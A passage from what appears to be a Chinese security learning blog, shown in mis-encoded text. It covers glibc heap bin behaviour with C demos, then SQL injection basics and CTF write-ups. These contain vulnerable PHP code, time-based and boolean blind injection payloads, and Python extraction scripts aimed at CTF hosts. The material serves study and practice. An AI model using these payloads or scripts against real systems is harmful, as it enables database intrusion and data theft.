æˆ‘ä»¬çŸ¥é“å¤§äº0x80çš„chunkè¢«é‡Šæ”¾ä¹‹åå°±æ”¾åˆ°äº†unsortedbinä¸Šé¢å»ï¼Œä½†æ˜¯unsortedbinæ˜¯ä¸€ä¸ªæœªåˆ†ç±»çš„binï¼Œä¸Šé¢çš„chunkä¹Ÿå¤„äºæœªåˆ†ç±»çš„çŠ¶æ€ã€‚ä½†æ˜¯è¿™äº›chunkéœ€è¦åœ¨ç‰¹å®šçš„æ¡ä»¶ä¸‹è¢«æ•´ç†ç„¶åæ”¾å…¥åˆ°smallbinsæˆ–è€…largebinsä¸­ è¿™ä¸ªæ•´ç†çš„è¿‡ç¨‹è¢«ç§°ä¸ºunsortedbinçš„â€œconsolidateâ€ï¼Œä½†æ˜¯â€œconsolidateâ€æ˜¯è¦åœ¨ç‰¹å®šçš„æ¡ä»¶ä¸‹æ‰ä¼šå‘ç”Ÿçš„ï¼Œå¹¶ä¸”ä¸mallocç´§å¯†ç›¸å…³ 2.è§¦å‘åœºæ™¯ å½“æˆ‘ä»¬mallocä¸€ä¸ªchunkï¼Œè¿™ä¸ªchunkçš„å¤§å°å¤§äºsmallbinçš„èŒƒå›´ï¼Œåœ¨unsortedbinä¸­å¯»æ‰¾å¯ç”¨çš„freechunkä½¿ç”¨æ—¶ï¼Œä¼šè§¦å‘malloc_conlolidate mallocæ—¶å¦‚æœbiné“¾ä¸­æ²¡æœ‰å¯ä»¥ä½¿ç”¨çš„freechunkï¼Œå¹¶ä¸”å»åˆ‡å‰²topchunkï¼Œå‘ç°topchunkä¹Ÿä¸å¤Ÿç”¨ï¼Œæ­¤æ—¶å›å»å†å»è°ƒç”¨malloc_consolidateè¿›è¡Œä¸€æ¬¡æ•´ç† å‘ç°unsortedbinä¸­æœ‰å¤§çš„freechunkå¯ä»¥åˆ‡å‰²ç»™mallocä½¿ç”¨æ—¶ï¼Œåˆ‡å‰²unsortedbinï¼Œäº§ç”Ÿlast remainderçš„æ—¶å€™ä¼šconsolidate ç€é‡å¼ºè°ƒï¼Œ1å’Œ2éƒ½ä¼šå»å¯»æ‰¾fastbinä¸­çš„free chunk 3.å…·ä½“åˆ†æå½“æˆ‘ä»¬mallocä¸€ä¸ªå¤§å°å¤§äºsmallbinçš„chunkæ—¶ï¼š ç¬¬ä¸€æ­¥ï¼šå°†fastbinsä¸­çš„chunkéƒ½æ•´ç†åˆ°unsortedbinä¸­ï¼Œæ•´ç†çš„è¿‡ç¨‹ä¸­å¦‚æœæœ‰ç‰©ç†ç›¸é‚»ä¸”ç©ºé—²çš„fastchunkå°±åˆå¹¶ï¼Œå¦‚æœfastchunkä¸topchunkç›¸é‚»ï¼Œé‚£ä¹ˆfastchunkå°±ä¸topchunkåˆå¹¶ï¼ˆè¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿåœ¨_int_mallocå‡½æ•°è°ƒç”¨çš„malloc_consolidateå‡½æ•°ä¸­ï¼‰ ç¬¬äºŒæ­¥ï¼šmallocå»æ£€æŸ¥unsortedbinä¸­æ˜¯å¦æœ‰ä¸è‡ªå·±mallocå¤§å°ç›¸å¯¹åº”çš„chunkå¯ä»¥ä½¿ç”¨ï¼Œå¦‚æœæœ‰ä¸è‡ªå·±mallocå¤§å°ç›¸å¯¹åº”çš„chunkå¯ä»¥ä½¿ç”¨å°±ç›´æ¥ä½¿ç”¨ï¼›å¦‚æœæ²¡æœ‰é‚£ä¹ˆå°±å»åˆ¤æ–­unsortedbinä¸­æ˜¯å¦æœ‰å¯ä»¥ç”¨æ¥åˆ‡å‰²çš„å¤§chunkå¯ä»¥ä½¿ç”¨ï¼Œå¦‚æœå¯ä»¥åˆ‡å‰²ï¼Œå°±åˆ‡å‰²å¤§çš„chunkä½¿ç”¨ï¼Œç„¶åäº§ç”Ÿlast remainderï¼ˆè¿™ä¸ªè¿‡ç¨‹å‘ç”Ÿåœ¨_int_mallocå‡½æ•°çš„forå¾ªç¯ä¸­ï¼‰ ç¬¬ä¸‰æ­¥ï¼šå¦‚æœæ²¡æœ‰å¯ä»¥åˆ‡å‰²çš„å¤§chunkå¯ä»¥ä½¿ç”¨ï¼Œæ­¤æ—¶å°±å°†unsortedbinä¸Šçš„chunkæ”¾å…¥åˆ°å¯¹åº”çš„binsé“¾ä¸Š ç¬¬å››æ­¥ï¼šmallocä»ç¬¬ä¸€æ¬¡åˆ†é…çš„å¤§å †å—ä¸Šé¢æ‰¾ç©ºé—´æ¥ä½¿ç”¨ 4.æ¼”ç¤ºä¸€1234567891011121314#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; void *p=malloc(0x30); sleep(0); //åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨ free(p); void *p2=malloc(0x500); free(p2); return 0;&#125; æ‰“æ–­ç‚¹ çœ‹å †ä¿¡æ¯ é‡Šæ”¾p1 çœ‹åˆ°è¿›å…¥fastbinä¸­ åˆ†é…p2 å¯ä»¥çœ‹åˆ°æˆ‘ä»¬p1å¥½åƒæ˜¯è¢«è¦†ç›–äº† æˆ‘ä»¬å…·ä½“æ¥è¯´ä¸€ä¸‹è¿™ä¸ªè¿‡ç¨‹ å½“åˆ†é…æ¯”small binå¤§çš„chunkæ—¶ï¼Œæˆ‘ä»¬å°±ä¼šè§¦å‘consolidateï¼Œ æˆ‘ä»¬çŸ¥é“fastchunkæ˜¯ä¸ä¼šåˆå¹¶çš„ æ‰€ä»¥å®ƒä»¬è¿™æ—¶å°±ä¼šè¿›å…¥unsortedbinä¸­ ç„¶åmallocå»åˆ‡å‰²unsortedbinä¸­çš„è¿™ä¸ªfreechunkï¼Œå‘ç°ä¸èƒ½å¤Ÿåˆ‡å‰²ï¼Œäºæ˜¯å°±æ”¾å…¥smallbinä¸­ï¼Œæ”¾å…¥smallbinä¸­ä¹‹åä¾¿æˆä¸ºsmallchunkäº†ï¼Œå°±å¯ä»¥ä¸topchunkåˆå¹¶äº† åˆå¹¶ä¹‹åmallocä»topchunkä¸­ç”³è¯·ä¸€ä¸ªå †å— 5.æ¼”ç¤ºäºŒ1234567891011121314#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; void *p=malloc(0x30); void *p1=malloc(0x30); sleep(0); //åªä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨ free(p); free(p1); void *p2=malloc(0x500); free(p2); return 0;&#125; é‡Šæ”¾p1å’Œp ä¸‹é¢æˆ‘ä»¬çŒœæƒ³ä¼šå‘é€ä»€ä¹ˆ? ç”±äºåˆ†é…chunkè¾ƒå¤§ æ‰€ä»¥æˆ‘ä»¬ä¼šè§¦å‘consolidate è¿™æ—¶ä¸¤ä¸ªfastchunkå°±ä¼šè¿›å…¥unsortedbinä¸­ æ ¹æ®ä¸Šé¢è§„åˆ™ å®ƒä¸‹ä¸€æ­¥å°±ä¼šè¿›å…¥small bins åˆå› ä¸ºå’Œtop chunkç›¸é‚» æ‰€ä»¥top chunkä¼šåˆå¹¶ ç›´è§‚æ„Ÿè§‰å°±æ˜¯æˆ‘ä»¬è¦†ç›–äº†ä¹‹å‰çš„chunk 0x14 last remainder1.å®šä¹‰ å¦‚æœåœ¨binsé“¾ä¸­å­˜åœ¨freechunkæ—¶ï¼Œå½“æˆ‘ä»¬å»mallocçš„æ—¶å€™ï¼Œmallocçš„è¯·æ±‚å¤§å°æ¯”freechunkçš„å¤§å°å°ï¼Œé‚£ä¹ˆarenaå°±ä¼šåˆ‡å‰²è¿™ä¸ªfreechunkç»™mallocä½¿ç”¨ï¼Œé‚£ä¹ˆåˆ‡å‰²ä¹‹åå‰©ä½™çš„chunkå°±è¢«ç§°ä¸ºâ€œlast remainderâ€ å½“äº§ç”Ÿlast remainderä¹‹åï¼Œè¡¨ç¤ºarenaçš„malloc_stateç»“æ„ä½“ä¸­çš„last_remainderæˆå‘˜æŒ‡é’ˆå°±ä¼šè¢«åˆå§‹åŒ–ï¼Œå¹¶ä¸”æŒ‡å‘è¿™ä¸ªlast remainder 2.äº§ç”Ÿåœºæ™¯ mallocçš„æ—¶å€™ï¼Œä¸è®ºmallocçš„å¤§å°ï¼Œé¦–å…ˆä¼šå»æ£€æŸ¥æ¯ä¸ªbinsé“¾ï¼ˆå‡ºå»fastbinsé“¾ï¼‰æ˜¯å¦æœ‰ä¸mallocç›¸ç­‰å¤§å°çš„freechunkï¼Œå¦‚æœæ²¡æœ‰å°±å»æ£€æŸ¥binsé“¾ä¸­æ˜¯å¦æœ‰å¤§çš„freechunkå¯ä»¥åˆ‡å‰²ï¼Œå¦‚æœåˆ‡å‰²ï¼Œé‚£ä¹ˆå°±åˆ‡å‰²å¤§çš„freechunkï¼Œé‚£ä¹ˆåˆ‡å‰²ä¹‹åçš„chunkæˆä¸ºlast remainderï¼Œå¹¶ä¸”last remainderä¼šè¢«æ”¾å…¥åˆ°unsortedbinä¸­ åˆ‡å‰²unsortedbinä¸­çš„å¤§chunkæ—¶ï¼š å½“unsortedbinæœ‰å¯¹åº”çš„freechunkå¯ä»¥ç»™mallocåˆ‡å‰²ä½¿ç”¨æ—¶ï¼Œunsortedbinä¼šå‘ç”Ÿä»¥ä¸‹æ­¥éª¤ï¼š â‘ å…ˆå°†è¿™äº›freechunkæ”¾ç½®åˆ°å¯¹åº”å¤§å°çš„binsé“¾ä¸Šï¼ˆæ”¾å…¥smallbinæˆ–largebinï¼‰ â‘¡æ”¾ç½®åˆ°å¯¹åº”çš„binsé“¾ä¸Šä¹‹åï¼Œåˆ‡å‰²æ­¤freechunk â‘¢åˆ‡å‰²ä¹‹åä¼šäº§ç”Ÿlast remainderï¼Œå†å°†last remainderæ”¾åˆ°unsortedbinä¸Š ä¾‹å¦‚ï¼š æ­¤æ—¶ï¼Œunsortedbinæœ‰ä¸¤ä¸ª0x800çš„freechunk æ­¤æ—¶ç”³è¯·ä¸€ä¸ª0x600çš„chunk é‚£ä¹ˆunsortedbinä¼šå…ˆconsolidateï¼ŒæŠŠä¸¤ä¸ª0x800çš„freechunkå…ˆç§»åŠ¨åˆ°largebinä¸­ ç„¶åå†åˆ‡å‰²largebinçš„freechunkï¼Œå°†åˆ‡å‰²åä½™ç•™ä¸‹çš„0x200æ”¾å…¥unsortedbin åˆ‡å‰²smallbinsã€largebinsä¸­çš„å¤§chunkæ—¶ï¼š â‘ åˆ‡å‰²smallbinsæˆ–è€…largebinsä¸­çš„å¤§freechunkï¼Œäº§ç”Ÿlast remainder â‘¡å°†last remainderæ”¾å…¥åˆ°unsortedbinä¸­ 3.last remainderçš„consolidateå½“æˆ‘ä»¬åˆ‡å‰²ä¸€ä¸ªbinsé“¾ä¸­çš„å¤§chunkæ—¶äº§ç”Ÿlast reminaderæ—¶ï¼Œä¼šå‘ç”Ÿconsolidateï¼Œä½†æ˜¯æ­¤ç§consolidateä¸ä¼šå»æ•´ç†fastbinsä¸­çš„freechunkï¼ˆé‡ç‚¹ï¼‰ 4.æ¼”ç¤ºä¸€12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include&lt;malloc.h&gt;#include&lt;unistd.h&gt;#include&lt;string.h&gt;int main()&#123; int size = 0x120; void *p = malloc(size); void *junk = malloc(size); //æ”¾ç½®é‡Šæ”¾på’Œqä¹‹åï¼Œpå’Œqå‘ç”Ÿåˆå¹¶ void *q = malloc(size); void *r = malloc(size); //æ”¾ç½®é‡Šæ”¾qä¹‹åï¼Œqå’Œtopchunkå‘ç”Ÿåˆå¹¶ printf(\"p:0x%x\\n\",p); printf(\"q:0x%x\\n\",q); printf(\"r:0x%x\\n\",r); strcpy(p,\"aaaaaaaabbbbbbbb\"); strcpy(q,\"ccccccccdddddddd\"); strcpy(r,\"eeeeeeeeffffffff\"); sleep(0); //åªä¸ºäº†æ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨ free(p); sleep(0); free(q); sleep(0); malloc(0x90); sleep(0); return 0;&#125; æ–­ç‚¹ é‡Šæ”¾på’Œq åˆ†é…0x90 é¦–å…ˆä¸¤ä¸ªunsortedbin chunkä¸­å¯ä»¥åˆ†å‰²åˆ°0x90é‚£ä¹ˆå°±ä¼šconsolidate å°†å…¶å…¨éƒ¨æ”¾å…¥smallbinsä¸­ ä¹‹ååˆ†å‰²å…¶ä¸­ä¸€éƒ¨åˆ† å¹¶å°†å‰©ä½™çš„æ”¾å…¥lastremainder 5.æ¼”ç¤ºäºŒ123456789101112131415161718192021222324252627#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x30; int size2=0x200; int *p1=malloc(size); int *p2=malloc(size2); int *temp=malloc(size); //é˜²æ­¢p2å’Œp3éƒ½è¢«é‡Šæ”¾ä¹‹åï¼Œp2å’Œp3å‘ç”Ÿåˆå¹¶ int *p3=malloc(size2); int *temp2=malloc(size); //é˜²æ­¢p3è¢«é‡Šæ”¾ä¹‹åä¸topchunkåˆå¹¶ sleep(0); //åªä¸ºæ‰“æ–­ç‚¹ä½¿ç”¨ free(p1); sleep(0); free(p2); free(p3); sleep(0); malloc(0x100); sleep(0); return 0;&#125; ç›´æ¥çœ‹é‡Šæ”¾p1 p2 p3 è¿™é‡Œç»§ç»­æƒ³ä¸€ä¸‹ä¸‹ä¸€æ­¥ä¼šå‘ç”Ÿä»€ä¹ˆï¼Ÿ åˆ†é…å¤§å°0x100å¯ä»¥åˆ†é… é‚£ä¹ˆå°±ç›´æ¥è§¦å‘consolidateè¯´æ˜smallbinä¸­å°±ä¼šæœ‰free chunk lastremainderä¼šæ”¾å…¥unsortedbinä¸­ï¼Œæ­¤å¤–fastfreechunkä¸ä¼šåˆå¹¶ é‚£ä¹ˆæˆ‘ä»¬å°±å¾—åˆ°äº† 6.æ¼”ç¤ºä¸‰123456789101112131415161718192021#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x300; int *p1=malloc(size); int *p2=malloc(size); //é˜²æ­¢p1è¢«é‡Šæ”¾ä¹‹åä¸topchunkåˆå¹¶ sleep(0); //ä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨ free(p1); sleep(0); malloc(0x700); sleep(0); malloc(0x200); return 0;&#125; ç›´æ¥çœ‹p1é‡Šæ”¾å ä¹‹åä¼šåˆ†é…0x700è¯´æ˜è¦åˆ†é…è¾ƒå¤§çš„chunk æ­¤æ—¶ä¼šè¢«æ•´ç†åˆ°smallbinsä¸­ ç»§ç»­åˆ†é…0x200 lastremainderä¼šè¿›å…¥unsortedbinä¸­ 7.æ¼”ç¤ºå››12345678910111213141516171819202122232425262728293031#include &lt;unistd.h&gt;#include &lt;malloc.h&gt; int main()&#123; int size=0x300; int *temp=malloc(0x30); int *p1=malloc(size); //é˜²æ­¢p1é‡Šæ”¾å¹¶consolidateåˆ°smallbinsä¸­ä¹‹åï¼Œå†é‡Šæ”¾p2å¯¼è‡´p1å’Œp2åˆå¹¶ï¼Œåˆå¹¶ä¹‹ååˆè¢«æ”¾å…¥unsortedbinä¸­ int *temp2=malloc(0x30); int *p2=malloc(0x100); int *p3=malloc(size);//é˜²æ­¢p2è¢«é‡Šæ”¾ä¹‹åä¸topchunkåˆå¹¶ sleep(0); //ä¸ºäº†ç¨‹åºæ‰“æ–­ç‚¹ä½¿ç”¨ï¼Œæ— å…¶ä»–ä½œç”¨ free(p1); sleep(0); malloc(0x700); sleep(0); free(temp); free(p2); sleep(0); malloc(0x200); return 0;&#125; å…ˆçœ‹å †ä¿¡æ¯ é‡Šæ”¾p1 åˆ†é…0x700 ç”±äºunsorted binä¸­çš„chunkä¸å¤Ÿ æ‰€ä»¥ç›´æ¥ä»top chunkä¸­åˆ†å‰² free tmpå’Œp2 é‡ç‚¹æ¥çœ‹æœ€åä¸€æ­¥ è¿™é‡Œï¼Œmalloc(0x200)ï¼Œæ­¤æ—¶mallocä¼šåˆ‡å‰²smallbinsä¸­çš„p1ï¼Œå¹¶äº§ç”Ÿlast remainderï¼ˆ0x602250ï¼‰ï¼Œå¹¶æŠŠlast remainderæ”¾å…¥åˆ°unsortedbinä¸­ã€‚ç”±äºåˆ‡å‰²chunkå¹¶äº§ç”Ÿlast remainderä¼šå‘ç”Ÿconsolidateï¼Œæ‰€ä»¥unsortedbinä¸­çš„p2ä»unsortedbinä¸­æ•´ç†åˆ°smallbinsä¸­ï¼ˆç”±äºæ­¤ç§æƒ…å†µçš„consolidateä¸ä¼šæ•´ç†fastbinsä¸­çš„chunkï¼Œæ‰€ä»¥fastbinsä¸­çš„chunkä»ç„¶åœ¨fastbinsä¸­ï¼‰","categories":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/categories/PWN/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"https://pz1o.top/tags/PWN/"},{"name":"å †","slug":"å †","permalink":"https://pz1o.top/tags/%E5%A0%86/"}]},{"title":"SQLæ³¨å…¥","slug":"SQLæ³¨å…¥","date":"2020-12-09T15:38:24.000Z","updated":"2020-12-09T15:39:32.233Z","comments":true,"path":"2020/12/09/SQLæ³¨å…¥/","link":"","permalink":"https://pz1o.top/2020/12/09/SQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"æˆ‘å°±å•çº¯æƒ³æŠŠè¿™äº›ä¸œè¥¿å­˜ä¸‹æ¥ åŸºç¡€å­¦ä¹ 1.SQLæ³¨å…¥çš„åˆ†ç±» åŸºäºä»æœåŠ¡å™¨æ¥æ”¶åˆ°çš„å“åº” åŸºäºé”™è¯¯çš„SQLæ³¨å…¥ è”åˆæŸ¥è¯¢çš„ç±»å‹ å †æŸ¥è¯¢æ³¨å°„ SQLç›²æ³¨ åŸºäºå¸ƒå°”SQLç›²æ³¨ åŸºäºæ—¶é—´çš„SQLç›²æ³¨ åŸºäºæŠ¥é”™çš„SQLç›²æ³¨ åŸºäºå¦‚ä½•å¤„ç†è¾“å…¥çš„SQLæŸ¥è¯¢ åŸºäºå­—ç¬¦ä¸² æ•°å­—æˆ–æ•´æ•° åŸºäºç¨‹åº¦å’Œé¡ºåºçš„æ³¨å…¥ ä¸€é˜¶æ³¨å°„ äºŒé˜¶æ³¨å°„ åŸºäºæ³¨å…¥ç‚¹çš„ä½ç½®ä¸Šçš„ é€šè¿‡ç”¨æˆ·è¾“å…¥çš„è¡¨å•åŸŸçš„æ³¨å°„ é€šè¿‡cookieæ³¨å°„ é€šè¿‡æœåŠ¡å™¨å˜é‡ 2.åŸºç¡€å‡½æ•°ä¸é€»è¾‘1.åŸºç¡€å‡½æ•°â€‹ concat(str1,str2) â€”â€”æ— åˆ†éš”è¿æ¥å­—ç¬¦ä¸² â€‹ concat_ws(separator,str1,str2) â€”â€”å«æœ‰åˆ†éš”ç¬¦è¿æ¥å­—ç¬¦ä¸² â€‹ group_concat(str1,str2) â€”â€”ä»¥é€—å·åˆ†éš”æ¯ä¸€æ¡æ•°æ®ï¼Œè¿æ¥ä¸€ä¸ªç»„çš„å­—ç¬¦ä¸² 2.åŸºç¡€é€»è¾‘12$id=$_GET['id'];$sql=\"select * from users where id='$id' limit 0,1\"; æ­¤å¤„è€ƒè™‘ä¸¤ä¸ªç‚¹ï¼Œä¸€ä¸ªæ˜¯é—­åˆå‰é¢ä½ çš„ â€˜ å¦ä¸€ä¸ªæ˜¯å¤„ç†åé¢çš„ â€˜ ï¼Œä¸€èˆ¬é‡‡ç”¨ä¸¤ç§æ€è·¯ï¼Œé—­åˆåé¢çš„å¼•å·æˆ–è€…æ³¨é‡Šæ‰ï¼Œæ³¨é‡Šæ‰é‡‡ç”¨â€”+ æˆ–è€… #ï¼ˆ%23ï¼‰ã€‚ limit ä»0å¼€å§‹ï¼Œè‡³å°‘1ä¸ªæ•°æ® limit 10 è‡³å°‘10ä¸ªæ•°æ® 3.unionæ“ä½œç¬¦çš„ç”¨æ³•unionæ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ªselectè¯­å¥çš„ç»“æœé›†ã€‚ä½†æ³¨æ„çš„æ˜¯ï¼Œselectçš„è¯­å¥å¿…é¡»æœ‰ç›¸åŒæ•°é‡çš„åˆ—ï¼Œåˆ—ä¹Ÿæœ‰ç›¸åŒçš„ç±»å‹ã€‚ 1select column_names from table_name1 union select column_names from table_name2; 4.ä¸€èˆ¬æ“ä½œ123use information_schema; //è¿›å…¥ç³»ç»Ÿæ•°æ®åº“show tables; select table_name from information_schema.tables where table_schema = 'myclass'; //æœç´¢å½“æ•°æ®åº“åä¸ºmyclassä¸­å„è¡¨çš„åå­— 1234select schema_name from information_schema.schemata; //çŒœæ•°æ®åº“select table_name from information_schema.tables where table_schema='æ•°æ®åº“å'; //çŒœæŸåº“çš„æ•°æ®è¡¨select column_name form information_schema.columns where table_name='è¡¨å'; //çŒœæŸè¡¨çš„æ•°æ®æ®µselect * from *; //çŒœæ•°æ®æ®µçš„å†…å®¹ 3.ç›²æ³¨çš„è®²è§£ï¼ˆå…ˆçœ‹1-4ä¹‹åå†æ¥çœ‹ï¼‰1.åŸºäºå¸ƒå°”çš„SQLç›²æ³¨2.åŸºäºæ—¶é—´çš„SQLç›²æ³¨æ—¶é—´ç›²æ³¨å’Œå¸ƒå°”ç›²æ³¨éå¸¸ç±»ä¼¼ï¼Œä½†æ—¶é—´ç›²æ³¨æ˜¯åˆ©ç”¨sleep()â€‹å’Œbenchmark()ç­‰å‡½æ•°è®©mysqlæ‰§è¡Œçš„æ—¶é—´å˜é•¿ã€‚ æ—¶é—´ç›²æ³¨å¤šä¸IF(expr1,expr2,expr3)ç»“åˆä½¿ç”¨ï¼Œå¦‚æœexpr1æ˜¯trueï¼Œåˆ™æ‰§è¡Œexpr2ï¼Œå¦åˆ™æ‰§è¡Œexpr3 INSERT INTOæ³¨å…¥(caseå»¶æ—¶ç›²æ³¨)çœ‹äº†æºç çŸ¥é“å–xffå¤´,å¹¶ä¸”explodeè¿‡æ»¤é€—å·ã€‚é¢˜ç›®çš„æºç å¦‚ä¸‹ï¼š 123456789101112131415161718192021222324252627error_reporting(0);function getIp()&#123;$ip &#x3D; &#39;&#39;;if(isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]))&#123;$ip &#x3D; $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]; &#x2F;&#x2F;è·å–è¯·æ±‚çš„ipåœ°å€&#125;else&#123;$ip &#x3D; $_SERVER[&#39;REMOTE_ADDR&#39;];&#125;$ip_arr &#x3D; explode(&#39;,&#39;, $ip); &#x2F;&#x2F;å°†é€—å·è¿‡æ»¤return $ip_arr[0]; &#125;$host&#x3D;&quot;localhost&quot;;$user&#x3D;&quot;&quot;;$pass&#x3D;&quot;&quot;;$db&#x3D;&quot;&quot;;$connect &#x3D; mysql_connect($host, $user, $pass) or die(&quot;Unable to connect&quot;);mysql_select_db($db) or die(&quot;Unable to select database&quot;);$ip &#x3D; getIp();echo &#39;your ip is :&#39;.$ip;$sql&#x3D;&quot;insert into client_ip (ip) values (&#39;$ip&#39;)&quot;;mysql_query($sql); è¿™é“é¢˜æ˜¯ç›²æ³¨é¢˜ç›®è¯´å¾—ä¹Ÿå¾ˆæ˜ç™½ï¼Œé—®é¢˜æ˜¯æ€ä¹ˆæ³¨å…¥å‘¢ï¼Ÿè¿™é‡Œæœ‰ä¸¤ä¸ªé—®é¢˜ ç¬¬ä¸€ä¸ªæ˜¯ç†è§£insert...intoæ³¨å…¥ 1234insert into client_ip(ip) values (&#39;$ip&#39;);&#x2F;&#x2F;è¿™é‡Œä¸»è¦ç»“åˆsleep()è¿›è¡Œæ³¨å…¥insert into student(id,name) values (1,&#39;&#39;+(select sleep(3)))&#x2F;&#x2F;è¿™æ ·å°±æ’å…¥äº†ä¸€æ¡id&#x3D;1,name&#x3D;nullçš„æ•°æ® ç¬¬äºŒä¸ªæ˜¯è¿‡æ»¤é€—å·çš„ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨if(a,b,c)åº”è¯¥ç”¨case...when...thenåŒæ—¶å¸¸ç”¨çš„æˆªå–å­—ç¬¦ä¸²å‡½æ•°substr([str],[start],[len])ä¹Ÿæœ‰æ›¿ä»£çš„substr([str]from [strat] for [len]) 123456789case...when...thenç®€å•caseå‡½æ•°case sex when &#39;1&#39; then &#39;nan&#39; when &#39;2&#39; then &#39;nv&#39; else &#39;qita&#39; endcaseæœç´¢å‡½æ•°case when sex &#x3D; &#39;1&#39; then &#39;nan&#39; when sex &#x3D; &#39;2&#39; then &#39;nv else &#39;qita&#39; end æ¥ä¸‹æ¥åªéœ€è¦æ„é€ å°±å¯ä»¥äº†ã€ 12payload &#x3D; &quot;1&#39; (case substr(database()from 1 for 1) &#x3D; [string] then sleep(3) else 1 end))#&quot;&#x2F;&#x2F;æœ€åä¸€ä¸ª)ç”¨æ¥é—­åˆ #ç”¨æ¥æ³¨é‡Š æ¥ä¸‹æ¥å°±å¯ä»¥å†™è„šæœ¬äº† 123456789101112131415161718192021222324252627282930import requestsallString = '''1234567890~`!@#$%^&amp;*()-_=+[]&#123;&#125;;:'\"|\\,&lt;.&gt;/?qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'''s = requests.session()url = \"http://123.206.87.240:8002/web15/\"data = \"\"flag = \"\"for i in range(1,50): for j in allString: payload = \"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\".format(i,j) headers = &#123;'x-forwarded-for':payload&#125; try: r = requests.get(url = url,headers = headers,timeout = 3) except requests.exceptions.ReadTimeout: flag += j print(flag) breakprint(\"flag is :&#123;\" +flag+\"&#125;\")//æ•°æ®åº“payload = \"1'+(case when (substr(database() from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\".format(i,j)åº“ä¸ºweb15//è¡¨payload = \"1'+(case when (substr((select group_concat(table_name)from information_schema.tables where table_schema='web15') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\".format(i,j)è¡¨ä¸ºclient_ip,flag//åˆ—payload = \"1'+(case when (substr((select group_concat(column_name)from information_schema.columns where table_name='flag') from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\".format(i,j)flag//flagpayload = \"1'+(case when (substr((select * from flag) from &#123;0&#125; for 1) = '&#123;1&#125;') then sleep(4) else 1 end))#\".format(i,j) å°±å¯ä»¥å¾—åˆ°flagäº†ã€‚ flag{cdbf14c9551d5be5612f7bb5d2867853} å¤šæ¬¡ï¼ˆmidå¸ƒå°”ç›²æ³¨ï¼‰ä¸»è¦å­¦ä¹ ä¸€ä¸‹å¼‚æˆ–æ³¨å…¥åˆ¤æ–­è¿‡æ»¤äº†å“ªäº›å…³é”®è¯ 123456789å¼‚æˆ–ï¼š1^1&#x3D;0ï¼Œ1^0&#x3D;1ï¼Œ0^1&#x3D;1ï¼Œ0^0&#x3D;0è¿™æ ·å½“æ„é€ ï¼š?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+è‹¥è¿”å›æ­£ç¡®é¡µé¢çš„å›æ˜¾(There is nothing.)ï¼Œåˆ™è¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºå‡;è‹¥è¿”å›é”™è¯¯é¡µé¢çš„å›æ˜¾(Error,Error,Error!)ï¼Œåˆ™è¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºçœŸã€‚è¿™é‡Œ?id&#x3D;1&#39;^(length(&#39;and&#39;)&#x3D;0)--+å‡å›æ˜¾äº†Error,Error,Error!ï¼Œè¯´æ˜(length(&#39;and&#39;)&#x3D;0)ä¸ºçœŸï¼Œé‚£ä¹ˆå¯åˆ¤æ–­andè¢«è¿‡æ»¤äº†åŒç†å¯åˆ¤æ–­orã€selectã€unionä¹Ÿè¢«è¿‡æ»¤äº†selselectectuniunionon æ³¨æ„çš„æ˜¯ï¼šinformationä¸­ä¹Ÿæœ‰or ç»§ç»­å­¦ä¹ ç›²æ³¨ 123456789101112131415import requestsdic &#x3D; &quot;0123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM&#123;&#125;_-&#x3D;&quot;s &#x3D; requests.session()url &#x3D; &#39;&#39;data &#x3D; &#39;&#39;for i in range(0,50): for j in dic: #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j) #payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;flag2&#39;),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j)p payload &#x3D; &quot;http:&#x2F;&#x2F;123.206.87.240:9004&#x2F;Once_More.php?id&#x3D;1&#39; and mid((select binary group_concat(flag2) from flag2),&#123;0&#125;,1)&#x3D;&#39;&#123;1&#125;&#39; --+&quot;.format(i,j) r &#x3D; s.get(url&#x3D;payload) if &#39;Nobody&#39; not in r.text: data +&#x3D; j break print(data) åŒæ—¶äº†è§£ä¸€ä¸‹æŠ¥é”™æ³¨å…¥ å¥½åƒæ³¨å…¥çš„æ—¶å€™æ˜¯ä¸éœ€è¦selectçš„ï¼Œä½†åœ¨mysqlä¸­æ˜¯éœ€è¦çš„ 